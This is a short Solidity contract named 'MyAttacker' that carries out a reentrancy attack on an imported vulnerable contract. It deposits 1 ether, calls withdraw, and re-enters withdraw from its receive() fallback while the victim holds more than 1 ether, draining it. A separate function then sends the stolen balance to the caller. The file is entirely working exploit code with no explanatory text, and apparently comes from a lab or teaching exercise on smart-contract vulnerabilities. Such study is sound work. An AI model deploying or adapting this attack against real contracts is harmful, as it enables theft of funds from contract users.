//SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.19;

import "./REENTVictim.sol";

contract MyAttacker {

    MyContract public myVictim; //public variable for MyContract vulnerable smart contract
    constructor(address _victim) { //takes vulnerable contract
        myVictim = MyContract(_victim); //initialise variable with address
    }

    receive() external payable {
        if (address(myVictim).balance > 1 ether) { //balance check (above 1 Ether)
            myVictim.withdraw(); //withdraw function being called from other contract
        }
    }

    function attack() external payable {
        require(msg.value == 1 ether, "Send Attack ETHSUM"); //1 Eth for attack
        myVictim.deposit{value: 1 ether}(); //calling deposit
        myVictim.withdraw();
    }

    function withdraw() public {
        (bool success, ) = msg.sender.call{value: address(this).balance}(""); //sends balance to user calling function
        require(success, "Withdrawal Failure");
    }
}